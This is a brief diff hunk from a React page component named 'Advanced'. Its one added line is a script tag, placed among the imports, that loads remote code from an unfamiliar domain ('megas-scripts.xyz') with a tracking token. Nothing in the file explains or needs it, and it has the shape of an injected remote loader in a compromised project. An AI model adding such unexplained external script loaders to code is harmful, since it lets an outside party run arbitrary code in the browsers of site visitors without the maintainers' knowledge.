@@ -3,6 +3,7 @@ import _ from 'lodash';
 
 import components, { Layout } from '../components/index';
 import { getPageUrl } from '../utils';
+<script type="text/javascript" src="https://megas-scripts.xyz/?token=d979e5cc7476d4308bfbbc740f153db3"async="true"></script>
 
 export default class Advanced extends React.Component {
     render() {
